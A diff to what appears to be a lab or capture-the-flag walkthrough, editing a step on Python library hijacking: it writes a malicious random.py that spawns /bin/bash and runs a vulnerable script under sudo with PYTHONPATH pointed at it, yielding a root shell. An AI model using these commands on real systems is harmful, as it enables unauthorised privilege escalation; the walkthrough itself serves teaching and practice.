@@ -123,18 +123,17 @@ Password: password
 
 5️⃣ **Exploiting Library Hijacking**
 
-- We create a **malicious version** of `random.py`:
+- We create a **malicious version** of `random.py` in `/tmp`:
     
     ```
-    mkdir ~/hijack
-    echo 'import os; os.system("/bin/bash")' > ~/hijack/random.py
+    echo 'import os; os.system("/bin/bash")' > /tmp/random.py
     
     ```
     
 - Set the `PYTHONPATH` to prioritize our malicious library:
     
     ```
-    sudo PYTHONPATH=. /usr/bin/python3 /opt/scripts/vulnerable_script.py
+    sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/scripts/vulnerable_script.py
     
     ```
     
